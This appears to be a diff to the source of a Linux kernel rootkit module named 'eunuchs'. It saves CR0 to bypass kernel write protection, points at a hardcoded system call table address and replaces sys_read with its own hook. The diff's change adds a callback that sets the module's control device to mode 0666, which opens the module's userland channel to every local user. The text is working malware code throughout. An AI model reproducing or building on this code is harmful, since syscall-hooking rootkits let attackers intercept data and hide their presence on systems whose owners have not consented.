@@ -35,7 +35,7 @@ MODULE_VERSION("1.0");
 MODULE_ALIAS("yes");
 
 /* This is the original value of CR0 */
-unsigned original_cr0;
+static unsigned original_cr0;
 
 /* BLOCK DEVICE */
 static struct class *eunuchs_cl;    // for class descriptor
@@ -85,6 +85,14 @@ static struct file_operations eunuchs_fops =
     .release = eunuchs_block_release
 };
 
+/* changes the permissions on the char device to be 666 */
+char* eunuchs_devnode(struct device *dev, umode_t *mode)
+{
+    if(mode)
+        *mode = 0666;
+    return NULL;
+}
+
 /* Creates a block device so that we can communicate with the lkm from userland */
 int eunuchs_dev_init()
 {
@@ -100,6 +108,8 @@ int eunuchs_dev_init()
         unregister_chrdev(eunuchs_dev_maj_number, EUNUCHS_DEVICE_NAME);
         return -1;
     }
+    eunuchs_cl->devnode = eunuchs_devnode;
+
     if(device_create(eunuchs_cl, NULL, MKDEV(eunuchs_dev_maj_number, 0), NULL, EUNUCHS_DEVICE_NAME) == NULL)
     {
         debug("device_create() failed\n");
@@ -134,7 +144,6 @@ static unsigned long *sct = 0xc167b180;
 
 /* Pointers to save the original functions to. */
 static typeof(sys_read) *orig_read;
-
 asmlinkage long eunuchs_read(int fd, char __user *buf, size_t count)
 {
     /* printk("reading..\n"); */
